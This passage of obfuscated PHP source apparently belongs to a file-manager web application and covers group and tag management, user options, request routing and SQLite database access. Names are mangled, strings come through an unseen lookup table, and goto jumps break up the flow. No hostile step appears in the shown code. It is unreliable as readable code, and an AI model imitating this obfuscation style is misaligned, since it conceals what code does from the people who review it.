$this->where(array($‚ú‡ô¢ => $ÇóÊĞ’û[$‚ú‡ô¢]))->save(array($…´¨Åõ[660] => $‡ƒÌœ¼¸)); } return $Ñéé¼Ì; } public function groupNameAuto($ÁìºŒ…â, $—Åì‚Éì) { $úâã²î =& $_SERVER[§Êá¸İ]; $·ò›Ú“ü = $this->where(array($úâã²î[485] => $ÁìºŒ…â))->getField($úâã²î[32], !0); if (!$·ò›Ú“ü || !in_array($—Åì‚Éì, $·ò›Ú“ü)) { return $—Åì‚Éì; } for ($±°îêúÚ = 1; $±°îêúÚ <= count($·ò›Ú“ü) + 1; $±°îêúÚ++) { $ ŒÎ„•Æ = $—Åì‚Éì . "\50{$±°îêúÚ}\x29"; if (!in_array($ ŒÎ„•Æ, $·ò›Ú“ü)) { return $ ŒÎ„•Æ; } } } public function groupSwitch($—£†”´, $°°”âœÍ) { $¦„ÑÑŸã =& $_SERVER[§Êá¸İ]; $º®Ëªî = array($¦„ÑÑŸã[1978] => array($¦„ÑÑŸã[7], array($—£†”´, $°°”âœÍ))); $ú‚úòÀÇ = $this->where($º®Ëªî)->select(); $ú‚úòÀÇ = array_to_keyvalue($ú‚úòÀÇ, $¦„ÑÑŸã[1978]); if (!isset($ú‚úòÀÇ[$—£†”´]) || !isset($ú‚úòÀÇ[$°°”âœÍ]) || $ú‚úòÀÇ[$—£†”´][$¦„ÑÑŸã[192]] == 0) { return !1; } $º®Ëªî = array($¦„ÑÑŸã[1978] => $—£†”´); $æşºúÉÚ = Model($¦„ÑÑŸã[2072])->where($º®Ëªî)->select(); if (!$æşºúÉÚ) { $æşºúÉÚ = array(); } foreach ($æşºúÉÚ as $Ú“ğå) { $„Ú§œä = $Ú“ğå[$¦„ÑÑŸã[1779]]; $º®Ëªî = array($¦„ÑÑŸã[1779] => $„Ú§œä, $¦„ÑÑŸã[1978] => $°°”âœÍ); $™‘è×íÄ = Model($¦„ÑÑŸã[2072])->where($º®Ëªî)->find(); if (!$™‘è×íÄ) { $¾ÓÑùô = array($°°”âœÍ => $Ú“ğå[$¦„ÑÑŸã[2086]]); Model($¦„ÑÑŸã[606])->userGroupAdd($„Ú§œä, $¾ÓÑùô); } Model($¦„ÑÑŸã[606])->userGroupRemove($„Ú§œä, $—£†”´); } $º®Ëªî = array($¦„ÑÑŸã[190] => 2, $¦„ÑÑŸã[192] => 0, $¦„ÑÑŸã[493] => 1, $¦„ÑÑŸã[577] => array($¦„ÑÑŸã[7], array($—£†”´, $°°”âœÍ))); $ïÜÏà™‚ = Model($¦„ÑÑŸã[911])->where($º®Ëªî)->field($¦„ÑÑŸã[2087])->select(); $ïÜÏà™‚ = array_to_keyvalue($ïÜÏà™‚, $¦„ÑÑŸã[577], $¦„ÑÑŸã[193]); $ıÎ…Ï©Š = !empty($ïÜÏà™‚[$—£†”´]) ? $ïÜÏà™‚[$—£†”´] : !1; if ($ıÎ…Ï©Š) { if (!$ïÜÏà™‚[$°°”âœÍ]) { $ïÜÏà™‚[$°°”âœÍ] = Model($¦„ÑÑŸã[911])->groupRootAdd($°°”âœÍ); } $ŞïÔÈİ = $ïÜÏà™‚[$°°”âœÍ]; $º®Ëªî = array($¦„ÑÑŸã[192] => $ıÎ…Ï©Š); $ïÜÏà™‚ = Model($¦„ÑÑŸã[911])->where($º®Ëªî)->field($¦„ÑÑŸã[2088])->select(); if (!$ïÜÏà™‚) { $ïÜÏà™‚ = array(); } Model($¦„ÑÑŸã[911])->moveClearAuth = !1; foreach ($ïÜÏà™‚ as $ŠşÚ˜ÂÍ) { $ù‰ÆèÇº = $ŠşÚ˜ÂÍ[$¦„ÑÑŸã[493]] == $¦„ÑÑŸã[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¦„ÑÑŸã[911])->move($ŠşÚ˜ÂÍ[$¦„ÑÑŸã[193]], $ŞïÔÈİ, $ù‰ÆèÇº); } Model($¦„ÑÑŸã[911])->moveClearAuth = !0; $º®Ëªî = array($¦„ÑÑŸã[190] => 2, $¦„ÑÑŸã[577] => $—£†”´); $áŠï÷Ûú = array($¦„ÑÑŸã[577] => $°°”âœÍ); Model($¦„ÑÑŸã[2089])->where($º®Ëªî)->save($áŠï÷Ûú); Model($¦„ÑÑŸã[2090])->where($º®Ëªî)->save($áŠï÷Ûú); } $this->_changeChildLevel($ú‚úòÀÇ[$—£†”´], $ú‚úòÀÇ[$°°”âœÍ], !0); $this->where(array($¦„ÑÑŸã[192] => $—£†”´))->save(array($¦„ÑÑŸã[192] => $°°”âœÍ)); $this->_clearChildrenCache($ú‚úòÀÇ[$°°”âœÍ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ÒµüíÛ’) { $±¤ÃùÇ¡ =& $_SERVER[§Êá¸İ]; return array($±¤ÃùÇ¡[2091] => array($ÒµüíÛ’[0], $±¤ÃùÇ¡[2092]), $±¤ÃùÇ¡[2093] => array($ÒµüíÛ’[0], $±¤ÃùÇ¡[2094])); } protected function get($ºĞ×Âú’) { $ôÙÃ‰¾ì =& $_SERVER[§Êá¸İ]; $Ú€ğºè² = Model($ôÙÃ‰¾ì[593])->metaGet($ºĞ×Âú’, $ôÙÃ‰¾ì[2095]); $Æö°¼â¿ = json_decode($Ú€ğºè², !0); return $Æö°¼â¿ ? $Æö°¼â¿ : array($ôÙÃ‰¾ì[2096] => $ôÙÃ‰¾ì[91], $ôÙÃ‰¾ì[445] => array()); } protected function set($³ÒÁèÛÄ, $ÒÔÎÎÉÔ) { $‰ÙÍ‡¥Ü =& $_SERVER[§Êá¸İ]; $ÒÔÎÎÉÔ = $ÒÔÎÎÉÔ ? $ÒÔÎÎÉÔ : array($‰ÙÍ‡¥Ü[2096] => $‰ÙÍ‡¥Ü[91], $‰ÙÍ‡¥Ü[445] => array()); return Model($‰ÙÍ‡¥Ü[593])->metaSet($³ÒÁèÛÄ, $‰ÙÍ‡¥Ü[2095], json_encode($ÒÔÎÎÉÔ)); } protected function getByTagID($µ÷ÓŸª£, $ÈÛ‹ëü) { $²ÁÚ·²» =& $_SERVER[§Êá¸İ]; if (!$µ÷ÓŸª£ || !$ÈÛ‹ëü) { return !1; } if (!Model($²ÁÚ·²»[593])->getInfoSimple($µ÷ÓŸª£)) { return !1; } $¶Ù¸ûîÚ = $this->get($µ÷ÓŸª£); if (!$¶Ù¸ûîÚ || !isset($¶Ù¸ûîÚ[$²ÁÚ·²»[445]])) { return !1; } $–ÆçãõÙ = array_find_by_field($¶Ù¸ûîÚ[$²ÁÚ·²»[445]], $²ÁÚ·²»[483], $ÈÛ‹ëü); return is_array($–ÆçãõÙ) ? $–ÆçãõÙ : !1; } public function listSource($Öà˜ßÔ, $Ù¨œ„û‚) { $õÀÕÃ¸ =& $_SERVER[§Êá¸İ]; if ($Ù¨œ„û‚ && !is_array($Ù¨œ„û‚)) { $Ù¨œ„û‚ = array($Ù¨œ„û‚); } $“ãÖÂŸ” = $this->listData($Öà˜ßÔ); $÷´Ú°¦¿ = array(); foreach ($“ãÖÂŸ” as $ñ°ôâ©) { $ßÑÚÅà = $ñ°ôâ©[$õÀÕÃ¸[87]]; if (!$ßÑÚÅà) { continue; } if (!isset($÷´Ú°¦¿[$ßÑÚÅà])) { $÷´Ú°¦¿[$ßÑÚÅà] = array(); } $÷´Ú°¦¿[$ßÑÚÅà][] = $ñ°ôâ©[$õÀÕÃ¸[508]]; } $îÔ¸ÏÌ€ = array(); foreach ($÷´Ú°¦¿ as $ÖÂüà¦ğ => $¢‰‰˜¯İ) { $ã°¡ß¬Œ = !0; if (!$Ù¨œ„û‚) { $îÔ¸ÏÌ€[] = $ÖÂüà¦ğ; continue; } foreach ($Ù¨œ„û‚ as $»ßà†•ú) { if (!in_array($»ßà†•ú, $¢‰‰˜¯İ)) { $ã°¡ß¬Œ = !1; break; } } if ($ã°¡ß¬Œ) { $îÔ¸ÏÌ€[] = $ÖÂüà¦ğ; } } if (!$îÔ¸ÏÌ€) { return array(); } $Ò¢ñ¶é = array($õÀÕÃ¸[499] => array($õÀÕÃ¸[500], $îÔ¸ÏÌ€), $õÀÕÃ¸[577] => $Öà˜ßÔ, $õÀÕÃ¸[190] => SourceModel::TYPE_GROUP); $ ½æ®ı = Model($õÀÕÃ¸[1428])->listSource($Ò¢ñ¶é); if (!$ ½æ®ı || count($îÔ¸ÏÌ€) == $ ½æ®ı[$õÀÕÃ¸[442]][$õÀÕÃ¸[443]]) { return $ ½æ®ı; } $‹÷ú  = array(); $â˜¸ó ò = array_to_keyvalue($ ½æ®ı[$õÀÕÃ¸[85]], $õÀÕÃ¸[12], $õÀÕÃ¸[193]); $Ü™ä´Íª = array_to_keyvalue($ ½æ®ı[$õÀÕÃ¸[86]], $õÀÕÃ¸[12], $õÀÕÃ¸[193]); $ˆÃ¢å = array_merge($Ü™ä´Íª, $â˜¸ó ò); foreach ($îÔ¸ÏÌ€ as $ßÑÚÅà) { if (!in_array($ßÑÚÅà, $ˆÃ¢å)) { $‹÷ú [] = $ßÑÚÅà; } } if ($‹÷ú ) { $this->removeBySource($Öà˜ßÔ, $‹÷ú ); } return $ ½æ®ı; } protected function listData($ÀÕ¢¤¬È) { $³¬éÊáÔ =& $_SERVER[§Êá¸İ]; $º®Ê‰ò = array($³¬éÊáÔ[1770] => 0, $³¬éÊáÔ[565] => array($³¬éÊáÔ[2097], 0), $³¬éÊáÔ[504] => $³¬éÊáÔ[2098] . $ÀÕ¢¤¬È); $‡Êåƒ‚É = $³¬éÊáÔ[2099]; $Ù£„½è¡ = $this->field($‡Êåƒ‚É)->where($º®Ê‰ò)->order($³¬éÊáÔ[2100])->select(); return $Ù£„½è¡ ? $Ù£„½è¡ : array(); } protected function addToTag($Ó™Ó€¹å, $®ÅõŠĞ¥, $Éàª±Šú) { $½ƒ¶ˆÛ =& $_SERVER[§Êá¸İ]; if (!$this->getByTagID($Ó™Ó€¹å, $Éàª±Šú) || !$®ÅõŠĞ¥) { return !1; } if (!Model($½ƒ¶ˆÛ[911])->pathInfo($®ÅõŠĞ¥)) { return !1; } $´’ÏÓ‰ğ = array($½ƒ¶ˆÛ[1770] => 0, $½ƒ¶ˆÛ[565] => $Éàª±Šú, $½ƒ¶ˆÛ[503] => $®ÅõŠĞ¥, $½ƒ¶ˆÛ[504] => $½ƒ¶ˆÛ[2101] . $Ó™Ó€¹å, $½ƒ¶ˆÛ[502] => $½ƒ¶ˆÛ[12], $½ƒ¶ˆÛ[1982] => 0); if ($this->where($´’ÏÓ‰ğ)->find()) { return !1; } return $this->add($´’ÏÓ‰ğ); } protected function removeFromTag($İ†Ö …, $ù”°¾°, $ú„‡ğˆÜ) { $‰³õä˜› =& $_SERVER[§Êá¸İ]; if (!$this->getByTagID($İ†Ö …, $ú„‡ğˆÜ) || !$ù”°¾°) { return !1; } if (is_array($ù”°¾°)) { $ù”°¾° = array($‰³õä˜›[7], $ù”°¾°); } $üÖ™£şË = array($‰³õä˜›[1770] => 0, $‰³õä˜›[565] => $ú„‡ğˆÜ, $‰³õä˜›[504] => $‰³õä˜›[2101] . $İ†Ö …, $‰³õä˜›[503] => $ù”°¾°); return $this->where($üÖ™£şË)->delete(); } protected function removeByTag($ş¤ÉÑÃî, $À¡ç…¶) { $ƒşÜÎÀÒ =& $_SERVER[§Êá¸İ]; if (!$this->getByTagID($ş¤ÉÑÃî, $À¡ç…¶)) { return !1; } $¶…ğÇØ˜ = array($ƒşÜÎÀÒ[1770] => 0, $ƒşÜÎÀÒ[565] => $À¡ç…¶, $ƒşÜÎÀÒ[504] => $ƒşÜÎÀÒ[2101] . $ş¤ÉÑÃî); return $this->where($¶…ğÇØ˜)->delete(); } protected function removeBySource($°éÈ¸¤´, $ØÒ”ïú) { $•šäó =& $_SERVER[§Êá¸İ]; if (!$°éÈ¸¤´ || !$ØÒ”ïú) { return !1; } if (is_array($ØÒ”ïú)) { $ØÒ”ïú = array($•šäó[7], $ØÒ”ïú); } $Óåõó = array($•šäó[1770] => 0, $•šäó[503] => $ØÒ”ïú, $•šäó[565] => array($•šäó[1102], 0), $•šäó[504] => $•šäó[2101] . $°éÈ¸¤´); return $this->where($Óåõó)->delete(); } } goto cÒî•Ãµµê; eœ¡¦ĞŠÔ‰: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ôíÌ¹²) { $ÜÛùë£ =& $_SERVER[§Êá¸İ]; $ÍÕç÷ = defined($ÜÛùë£[2204]) && USER_ID ? USER_ID : $ÜÛùë£[12]; return "\125\163\145\x72\117\x70\x74\x69\x6f\156\137{$ôíÌ¹²}\137" . $ÍÕç÷; } protected function filterWhere($¯Ş‡º) { $ù´óèšË =& $_SERVER[§Êá¸İ]; $¯Ş‡º[$ù´óèšË[1779]] = defined($ù´óèšË[2204]) && USER_ID ? USER_ID : $ù´óèšË[12]; return $¯Ş‡º; } public function cacheRemoveUser($£­â—Î, $†°ñ–º) { return Cache::remove("\125\163\x65\162\117\x70\164\151\157\x6e\137{$£­â—Î}\x5f" . $†°ñ–º); } protected function optionDefault($¿¡ˆå– = '') { $‚²ÏÎÍù =& $_SERVER[§Êá¸İ]; if ($¿¡ˆå– == $‚²ÏÎÍù[12]) { return $GLOBALS[$‚²ÏÎÍù[6]][$‚²ÏÎÍù[2504]]; } if ($¿¡ˆå– == $‚²ÏÎÍù[2505]) { return $GLOBALS[$‚²ÏÎÍù[6]][$‚²ÏÎÍù[2506]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\164\x61\147\114\x69\163\164"; public $modelType = "\x55\x73\x65\x72\x4f\x70\x74\151\157\156"; public $field = array("\156\141\155\x65", "\163\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($Œ•…ª¹ø = false, $¼õÊÇ˜À = "\163\157\162\164", $§è¾˜å = false) { return parent::listData($Œ•…ª¹ø, $¼õÊÇ˜À, $§è¾˜å); } public function remove($Î³®×¥ı) { return parent::remove($Î³®×¥ı); } public function add($š Ì¬ë­, $´¨·¹±¼ = "\154\x61\142\x65\154\x2d\x67\x72\x65\x79\x2d\156\157\x72\155\141\x6c") { $Ñş»Õı =& $_SERVER[§Êá¸İ]; if ($this->findByName($š Ì¬ë­)) { return !1; } $¾ü´¦ª¬ = array($Ñş»Õı[502] => $š Ì¬ë­, $Ñş»Õı[566] => $´¨·¹±¼, $Ñş»Õı[1982] => $this->getSort($Ñş»Õı[335]) + 1); return parent::insert($¾ü´¦ª¬); } public function update($â¿şß²Ú, $»Ì¾‹¬ä) { $ÕĞúì†” =& $_SERVER[§Êá¸İ]; $ÖåŸëˆ· = $this->listData($â¿şß²Ú); $ÊÊÙ÷íŒ = $this->findByName($»Ì¾‹¬ä[$ÕĞúì†”[32]]); if (!$ÖåŸëˆ· || $ÊÊÙ÷íŒ && $ÊÊÙ÷íŒ[$ÕĞúì†”[483]] != $ÖåŸëˆ·[$ÕĞúì†”[483]]) { return !1; } return parent::update($â¿şß²Ú, $»Ì¾‹¬ä); } public function moveTop($ş“Ûë×) { $©üÜ­èò =& $_SERVER[§Êá¸İ]; $¡ñÂÊºì = parent::listData(); $›ŠŠªŸ = $this->getSort($©üÜ­èò[334]); foreach ($¡ñÂÊºì as &$–›¼ƒó÷) { if ($–›¼ƒó÷[$©üÜ­èò[483]] == $ş“Ûë×) { $–›¼ƒó÷[$©üÜ­èò[2002]] = $›ŠŠªŸ; continue; } $–›¼ƒó÷[$©üÜ­èò[2002]] += 1; } unset($–›¼ƒó÷); return parent::resetData($¡ñÂÊºì); } public function moveBottom($ƒŒ’Ş‰œ) { $œš•²¥ =& $_SERVER[§Êá¸İ]; $êÑ‡„õß = $this->getSort($œš•²¥[335]) + 1; return parent::update($ƒŒ’Ş‰œ, array($œš•²¥[2002] => $êÑ‡„õß)); } public function resetSort($ƒÆ±«Éâ) { $íúëó“Ï =& $_SERVER[§Êá¸İ]; $Ç¯İáæ» = array(); $ƒÆ±«Éâ = is_array($ƒÆ±«Éâ) ? $ƒÆ±«Éâ : array(); for ($ôü¢Ìçè = 0; $ôü¢Ìçè < count($ƒÆ±«Éâ); $ôü¢Ìçè++) { $Ç¯İáæ»[$ƒÆ±«Éâ[$ôü¢Ìçè] . $íúëó“Ï[12]] = $ôü¢Ìçè + 1; } $¹¬ï´Ö = parent::listData(); foreach ($¹¬ï´Ö as &$„ÂÆÓª) { $÷™ıÕß¡ = $Ç¯İáæ»[$„ÂÆÓª[$íúëó“Ï[483]]]; $„ÂÆÓª[$íúëó“Ï[2002]] = $÷™ıÕß¡ ? $÷™ıÕß¡ : $„ÂÆÓª[$íúëó“Ï[2002]]; } unset($„ÂÆÓª); return parent::resetData($¹¬ï´Ö); } private function getSort($Ô–¶Õ“‹) { $ØÜî×­³ =& $_SERVER[§Êá¸İ]; $»©–©¹š = parent::listData(); $óÑôôš = array_to_keyvalue($»©–©¹š, $ØÜî×­³[12], $ØÜî×­³[2002]); if (!$óÑôôš) { $óÑôôš = array(0); } $‘½úËØ¤ = $Ô–¶Õ“‹ == $ØÜî×­³[335] ? max($óÑôôš) : min($óÑôôš); return intval($‘½úËØ¤); } } goto aŞë¸ŒôÄé; cÍÂÚîì“­: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $½·ºË—½ =& $_SERVER[§Êá¸İ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$½·ºË—½[6]] =& $config; $this->values[$½·ºË—½[7]] =& $in; $this->tpl = TEMPLATE . MOD . $½·ºË—½[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‹–²æ§È) { if (1 === func_num_args()) { $this->{$‹–²æ§È} = new $‹–²æ§È(); } else { $“ò¦·ÂÉ = new ReflectionClass($‹–²æ§È); $š‰À¹‡­ = func_get_args(); array_shift($š‰À¹‡­); $this->{$‹–²æ§È} = $“ò¦·ÂÉ->newInstanceArgs($š‰À¹‡­); } return $this->{$‹–²æ§È}; } public function routeBind($‹¸˜é®Ë, $Şù¹£Ó, $œˆş‹³ = 3) { $•¿ÁŸşÅ =& $_SERVER[§Êá¸İ]; $£İ¦ë„ä = $this->in[$•¿ÁŸşÅ[9]]; $‹¸˜é®Ë = str_replace($•¿ÁŸşÅ[10], $•¿ÁŸşÅ[11], trim(trim($‹¸˜é®Ë, $•¿ÁŸşÅ[8]), $•¿ÁŸşÅ[12])); if (!$‹¸˜é®Ë || count($£İ¦ë„ä) <= $œˆş‹³) { return !1; } $İñçÁˆ = !0; $úûŸüô = explode($•¿ÁŸşÅ[8], $‹¸˜é®Ë); for ($˜àÎ©‹È = 0; $˜àÎ©‹È < count($úûŸüô); $˜àÎ©‹È++) { if ($úûŸüô[$˜àÎ©‹È] != $£İ¦ë„ä[$œˆş‹³ + $˜àÎ©‹È]) { $İñçÁˆ = !1; break; } } if (!$İñçÁˆ) { return; } call_user_func_array(array($this, $Şù¹£Ó), array()); } public function routeArgs($–ç··ß = 3) { $¡‘íòğ‘ = $this->in[$_SERVER[§Êá¸İ][9]]; if (count($¡‘íòğ‘) <= $–ç··ß) { return array(); } $äşÙö®´ = array(); for ($äëÑÈÃ¡ = $–ç··ß; $äëÑÈÃ¡ < count($¡‘íòğ‘); $äëÑÈÃ¡ += 2) { $äşÙö®´[$¡‘íòğ‘[$äëÑÈÃ¡]] = $¡‘íòğ‘[$äëÑÈÃ¡ + 1]; $this->in[$¡‘íòğ‘[$äëÑÈÃ¡]] = $¡‘íòğ‘[$äëÑÈÃ¡ + 1]; } return $äşÙö®´; } protected function assign($¥È°Š³à, $¶®†´§) { $this->values[$¥È°Š³à] = $¶®†´§; } protected function display($¶¡†µŒ) { ob_end_clean(); extract($this->values); require $this->tpl . $¶¡†µŒ; } } class DbSqliteBase extends Db { public function __construct($´ãşƒÉâ = '') { $µí¹  =& $_SERVER[§Êá¸İ]; if (!extension_loaded($µí¹ [13])) { think_exception(think_lang($µí¹ [14]) . $µí¹ [15]); } if (!empty($´ãşƒÉâ)) { if (!isset($´ãşƒÉâ[$µí¹ [16]])) { $´ãşƒÉâ[$µí¹ [16]] = 438; } $this->config = $´ãşƒÉâ; if (empty($this->config[$µí¹ [17]])) { $this->config[$µí¹ [17]] = array(); } } } public function connect($¾¥½âæ© = '', $ò÷ÈÛî = 0) { $Î­Åéƒ =& $_SERVER[§Êá¸İ]; if (!isset($this->linkID[$ò÷ÈÛî])) { if (empty($¾¥½âæ©)) { $¾¥½âæ© = $this->config; } $½¨í øÕ = !empty($¾¥½âæ©[$Î­Åéƒ[17]][$Î­Åéƒ[18]]) ? $¾¥½âæ©[$Î­Åéƒ[17]][$Î­Åéƒ[18]] : $this->pconnect; $®î–´š = $½¨í øÕ ? $Î­Åéƒ[19] : $Î­Åéƒ[20]; $this->linkID[$ò÷ÈÛî] = $®î–´š($¾¥½âæ©[$Î­Åéƒ[21]], $¾¥½âæ©[$Î­Åéƒ[16]]); if (!$this->linkID[$ò÷ÈÛî]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ò÷ÈÛî], 30000); if (1 != think_config($Î­Åéƒ[22])) { unset($this->config); } } return $this->linkID[$ò÷ÈÛî]; } public function free() { $this->queryID = null; } public function query($€ØŠÖÔç) { $Çñßò =& $_SERVER[§Êá¸İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $€ØŠÖÔç; if ($this->queryID) { $this->free(); } think_action_status($Çñßò[23], 1); think_status($Çñßò[24]); $this->queryID = sqlite_query($this->_linkID, $€ØŠÖÔç); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $´¦ÛÊ = $this->getAll(); return $´¦ÛÊ; } } public function execute($‰ñÁçÏ ) { $ÃÈÃó÷ =& $_SERVER[§Êá¸İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‰ñÁçÏ ; if ($this->queryID) { $this->free(); } think_action_status($ÃÈÃó÷[25], 1); think_status($ÃÈÃó÷[24]); $½æºö²£ = sqlite_exec($this->_linkID, $‰ñÁçÏ ); $this->debug(); if (!1 === $½æºö²£) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[§Êá¸İ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $÷ŠÆ¤¼Œ = sqlite_query($this->_linkID, $_SERVER[§Êá¸İ][27]); if (!$÷ŠÆ¤¼Œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹é«óÕĞ = sqlite_query($this->_linkID, $_SERVER[§Êá¸İ][28]); if (!$¹é«óÕĞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $€ºå¨Ù = array(); if ($this->numRows > 0) { for ($¾Ô¼æë– = 0; $¾Ô¼æë– < $this->numRows; $¾Ô¼æë–++) { $€ºå¨Ù[$¾Ô¼æë–] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $€ºå¨Ù; } public function getFields($Ñ–ÜçÊá) { $©Úâ€Ï =& $_SERVER[§Êá¸İ]; $è¼›å™Æ = $this->query($©Úâ€Ï[29] . $Ñ–ÜçÊá . $©Úâ€Ï[30]); $³ŠÎüæİ = array(); if ($è¼›å™Æ) { foreach ($è¼›å™Æ as $ú»¾­Äò => $ ½–ÏÍÓ) { $³ŠÎüæİ[$ ½–ÏÍÓ[$©Úâ€Ï[31]]] = array($©Úâ€Ï[32] => $ ½–ÏÍÓ[$©Úâ€Ï[31]], $©Úâ€Ï[33] => $ ½–ÏÍÓ[$©Úâ€Ï[34]], $©Úâ€Ï[35] => (bool) ($ ½–ÏÍÓ[$©Úâ€Ï[36]] === $©Úâ€Ï[12]), $©Úâ€Ï[37] => $ ½–ÏÍÓ[$©Úâ€Ï[38]], $©Úâ€Ï[39] => strtolower($ ½–ÏÍÓ[$©Úâ€Ï[40]]) == $©Úâ€Ï[41], $©Úâ€Ï[42] => strtolower($ ½–ÏÍÓ[$©Úâ€Ï[43]]) == $©Úâ€Ï[44]); } } return $³ŠÎüæİ; } public function getTables($‹Òê£ê¦ = '') { $êå·ñÂÔ =& $_SERVER[§Êá¸İ]; $ûÆ›®„ = $this->query($êå·ñÂÔ[45] . $êå·ñÂÔ[46] . $êå·ñÂÔ[47]); $ ıÀ¼åê = array(); foreach ($ûÆ›®„ as $œÀİ±ÍÍ => $À¼Å¯¬ê) { $ ıÀ¼åê[$œÀİ±ÍÍ] = current($À¼Å¯¬ê); } return $ ıÀ¼åê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¨ëÜÎ«’ =& $_SERVER[§Êá¸İ]; $é«¿û¹Å = sqlite_last_error($this->_linkID); $this->error = $é«¿û¹Å . $¨ëÜÎ«’[4] . sqlite_error_string($é«¿û¹Å); if ($¨ëÜÎ«’[12] != $this->queryStr) { $this->error .= LNG($¨ëÜÎ«’[48]) . $this->queryStr; } think_trace($this->error, $¨ëÜÎ«’[12], $¨ëÜÎ«’[49]); return $this->error; } public function escapeString($®çıñƒŸ) { return sqlite_escape_string($®çıñƒŸ); } public function parseLimit($Ÿ¿­¼Ì) { $†Õáø—¼ =& $_SERVER[§Êá¸İ]; $ÎÚÏÂûÜ = $†Õáø—¼[12]; if (!empty($Ÿ¿­¼Ì)) { $Ÿ¿­¼Ì = explode($†Õáø—¼[50], $Ÿ¿­¼Ì); if (count($Ÿ¿­¼Ì) > 1) { $ÎÚÏÂûÜ .= $†Õáø—¼[51] . $Ÿ¿­¼Ì[1] . $†Õáø—¼[52] . $Ÿ¿­¼Ì[0] . $†Õáø—¼[53]; } else { $ÎÚÏÂûÜ .= $†Õáø—¼[51] . $Ÿ¿­¼Ì[0] . $†Õáø—¼[53]; } } return $ÎÚÏÂûÜ; } } class DbSqlite3Base extends Db { public function __construct($¹¯’ ”ê = '') { $˜ø¾ =& $_SERVER[§Êá¸İ]; if (!class_exists($˜ø¾[54])) { think_exception(think_lang($˜ø¾[14]) . $˜ø¾[55]); } if (!empty($¹¯’ ”ê)) { if (!isset($¹¯’ ”ê[$˜ø¾[16]])) { $¹¯’ ”ê[$˜ø¾[16]] = 438; } $this->config = $¹¯’ ”ê; if (empty($this->config[$˜ø¾[17]])) { $this->config[$˜ø¾[17]] = array(); } } } public function connect($¢Ç„—Ö® = '', $õ–û¼Û˜ = 0) { $Ø¢à†Š¬ =& $_SERVER[§Êá¸İ]; if (!isset($this->linkID[$õ–û¼Û˜])) { if (empty($¢Ç„—Ö®)) { $¢Ç„—Ö® = $this->config; } $this->linkID[$õ–û¼Û˜] = new SQLite3($¢Ç„—Ö®[$Ø¢à†Š¬[21]]); if (!$this->linkID[$õ–û¼Û˜]) { think_exception($this->linkID[$õ–û¼Û˜]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$õ–û¼Û˜]->busyTimeout(30000); if (1 != think_config($Ø¢à†Š¬[22])) { unset($this->config); } } return $this->linkID[$õ–û¼Û˜]; } public function free() { $this->queryID = null; } public function query($³ÛÚÉ¼) { $ûÄÊŒŒ§ =& $_SERVER[§Êá¸İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³ÛÚÉ¼; if ($this->queryID) { $this->free(); } think_action_status($ûÄÊŒŒ§[23], 1); think_status($ûÄÊŒŒ§[24]); $this->queryID = $this->_linkID->query($³ÛÚÉ¼); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $§ïÓ³ã = $this->getAll(); $this->numRows = count($§ïÓ³ã); return $§ïÓ³ã; } } public function execute($†Ê—ÄÓ©) { $‚»¾¡ı =& $_SERVER[§Êá¸İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $†Ê—ÄÓ©; if ($this->queryID) { $this->free(); } think_action_status($‚»¾¡ı[25], 1); think_status($‚»¾¡ı[24]); $€ãÇÆØ = $this->_linkID->exec($†Ê—ÄÓ©); $this->debug(); if (!1 === $€ãÇÆØ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[§Êá¸İ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªÍÏûÊ = $this->_linkID->query($_SERVER[§Êá¸İ][27]); if (!$ªÍÏûÊ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $­ñÁ¡ôá = $this->_linkID->query($_SERVER[§Êá¸İ][28]); if (!$­ñÁ¡ôá) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¡Úßï¡ì = array(); while ($Ş†Ø¬ú– = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¡Úßï¡ì[] = $Ş†Ø¬ú–; } $this->queryID->reset(); return $¡Úßï¡ì; } public function getFields($‹ÍÈ³ì‹) { $íõŸÕ˜ =& $_SERVER[§Êá¸İ]; $‚òä“¬¨ = $this->query($íõŸÕ˜[29] . $‹ÍÈ³ì‹ . $íõŸÕ˜[30]); $–ŒÍçÔÒ = array(); if ($‚òä“¬¨) { foreach ($‚òä“¬¨ as $ÉÖĞ®× => $ÀÕØÑ‚ú) { 